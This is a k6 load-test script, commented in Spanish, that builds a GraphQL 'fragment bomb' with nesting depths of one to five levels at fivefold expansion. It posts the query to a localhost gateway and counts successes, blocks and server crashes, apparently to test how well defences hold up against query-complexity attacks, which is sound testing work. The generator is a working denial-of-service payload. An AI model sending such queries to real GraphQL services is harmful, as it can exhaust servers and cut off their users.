import http from 'k6/http';
import { check, sleep } from 'k6';
import { Trend, Rate } from 'k6/metrics';

// =============================================================================
// UC-05 Bomba de Fragmentos
// Variable independiente: profundidad de fragmentos con expansion 5^N
//   Nivel 1 =    5 referencias efectivas
//   Nivel 2 =   25
//   Nivel 3 =  125
//   Nivel 4 =  625
//   Nivel 5 = 3125
// Concurrencia: fija en VUs=1 (variable independiente = profundidad, no carga)
// Ventana: 60 segundos por escenario
// =============================================================================
export const LatenciaMedia = new Trend('iso_latencia_media');
export const TasaFallosRed = new Rate('iso_tasa_fallos_red');
export const TasaBloqueadas = new Rate('iso_tasa_bloqueadas'); // Bloqueo por control (4xx)

const LEVEL = __ENV.LEVEL ? parseInt(__ENV.LEVEL) : 1;
const SPREADS = 5;  // 5 referencias por nivel (expansion 5^N)

export const options = {
  vus: __ENV.VUS ? parseInt(__ENV.VUS) : 1,
  duration: '60s',
  userAgent: 'K6-GraphQL-Ofensive-Agent/1.0',
  thresholds: {
    'http_req_failed':   [{ threshold: 'rate<0.99', abortOnFail: false }],
    'http_req_duration': [{ threshold: 'p(95)<60000', abortOnFail: false }],
  },
};

// Genera N fragmentos anidados con 5 spreads cada uno.
// F(level) referencia a F(level+1) hasta llegar al ultimo, que expone los campos escalares.
function buildQuery(level) {
  const fragmentDefs = [];
  const rootSpread = Array(SPREADS).fill('...F1').join('\n    ');

  for (let i = 1; i < level; i++) {
    const nextSpread = Array(SPREADS).fill(`...F${i + 1}`).join('\n    ');
    fragmentDefs.push(`fragment F${i} on Usuario {\n    ${nextSpread}\n}`);
  }
  // Ultimo fragmento con los campos escalares reales
  fragmentDefs.push(`fragment F${level} on Usuario {\n    id\n    nombre\n    email\n}`);

  return `query BombaDeFragmentos {
  listarUsuarios {
    ${rootSpread}
  }
}

${fragmentDefs.join('\n\n')}`;
}

const GATEWAY_URL = 'http://localhost:4000/graphql';
const QUERY = buildQuery(LEVEL);

export default function () {
  const payload = JSON.stringify({ query: QUERY });
  const params = {
    headers: {
      'Content-Type': 'application/json',
      'X-Attack-Vector': `UC-05-Fragment-Bomb-Level-${LEVEL}`,
    },
    timeout: '30s',
  };

  const res = http.post(GATEWAY_URL, payload, params);

  check(res, {
    'Respuesta exitosa (200 sin errores)':      (r) => r.status === 200 && !r.body.includes('errors'),
    'Bloqueado por control (400/403)':          (r) => r.status === 400 || r.status === 403 || (r.status === 200 && r.body.includes('errors')),
    'Servidor caido (500/502/504/timeout)':     (r) => r.status >= 500 || r.error,
  });

  LatenciaMedia.add(res.timings.duration);
  const falloReal = res.status >= 500 || !!res.error;
  TasaFallosRed.add(falloReal);
  const bloqueado4xx = (res.status === 400 || res.status === 403);
  TasaBloqueadas.add(bloqueado4xx);

  sleep(1);
}
